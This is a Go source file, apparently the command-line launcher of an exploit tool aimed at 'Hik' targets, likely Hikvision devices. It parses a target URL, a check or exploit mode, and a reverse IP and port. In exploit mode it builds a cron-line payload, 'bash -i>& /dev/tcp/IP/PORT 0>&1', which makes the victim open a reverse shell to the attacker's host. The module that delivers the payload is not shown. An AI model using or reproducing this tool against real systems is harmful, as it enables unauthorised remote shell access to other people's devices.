package modules

import (
	"flag"
	"fmt"
	"log"
)

var (
	check       bool
	exploit     bool
	target      string
	reverseIp   string
	reversePort string
)

func Run() {
	flag.BoolVar(&check, "c", false, "check is vuln(default)")
	flag.BoolVar(&exploit, "e", false, "reverse a shell")
	flag.StringVar(&target, "u", "", "target url")
	flag.StringVar(&reverseIp, "r", "", "reverse  ip")
	flag.StringVar(&reversePort, "p", "", "reverse port")
	flag.Parse()
	if check && exploit {
		log.Fatalln("You Can Only Specific Check Mode Or Exploit Mode")
	}
	if _, _, invaild := UrlChecker(target); !invaild {
		log.Fatalln("URL Invalid.")
	}
	if exploit {
		if reverseIp == "" || reversePort == "" {
			log.Fatalln("Exploit Mode Need You Specific A Reverse IP And Port Use -r And -p Param")
		}
		if !IPChecker(reverseIp) {
			log.Fatalln("IP Invalid.")
		}
		if !PortChecker(reversePort) {
			log.Fatalln("Port Invalid.")
		}
	}
	hik := Hik{
		IP:      reverseIp,
		Port:    reversePort,
		Target:  target,
		Exploit: exploit,
		Cmd: fmt.Sprintf(`

* * * * * bash -i>& /dev/tcp/%s/%s 0>&1

`, reverseIp, reversePort),
	}
	hik.Run()
}
